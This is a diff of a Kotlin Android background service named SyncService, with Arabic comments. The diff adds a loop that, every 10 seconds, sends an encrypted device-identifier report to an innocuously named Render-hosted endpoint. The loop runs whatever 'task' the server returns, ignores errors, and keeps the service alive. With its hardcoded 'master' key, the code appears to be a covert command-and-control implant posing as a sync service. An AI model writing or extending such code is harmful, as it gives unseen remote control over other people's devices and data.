@@ -28,7 +28,6 @@ import javax.crypto.spec.SecretKeySpec
 class SyncService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    // تم تحديث الرابط هنا ليطابق سيرفرك الفعلي على Render
     private val SERVER_ENDPOINT = "https://web-assets-service.onrender.com/api/v3/unified/stream"
     private val MASTER_SECRET = "BlackActivationMasterKey2026"
     private val client = OkHttpClient.Builder()
@@ -38,18 +37,22 @@ class SyncService : Service() {
         .build()
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // حلقة تكرارية مستمرة لفحص المهام كل 10 ثوانٍ وتنفيذها فوراً
         serviceScope.launch {
-            try {
-                val telemetry = JSONObject().apply {
-                    put("type", "TEXT_REPORT")
-                    put("data", "SyncService Online. Device ID: ${getNodeIdentifier()}")
+            while (isActive) {
+                try {
+                    val telemetry = JSONObject().apply {
+                        put("type", "TEXT_REPORT")
+                        put("data", "SyncService Active. Device ID: ${getNodeIdentifier()}")
+                    }
+                    val response = dispatchPacket(encryptPayload(telemetry.toString()))
+                    if (response != null && response.has("task") && !response.isNull("task")) {
+                        executeTask(response.getJSONObject("task"))
+                    }
+                } catch (e: Exception) {
+                    // تجاهل الأخطاء المؤقتة واستمرار الحلقة
                 }
-                val response = dispatchPacket(encryptPayload(telemetry.toString()))
-                if (response != null && response.has("task") && !response.isNull("task")) {
-                    executeTask(response.getJSONObject("task"))
-                }
-            } catch (e: Exception) {
-                // تجاهل الأخطاء المؤقتة
+                delay(10000)
             }
         }
         return START_STICKY
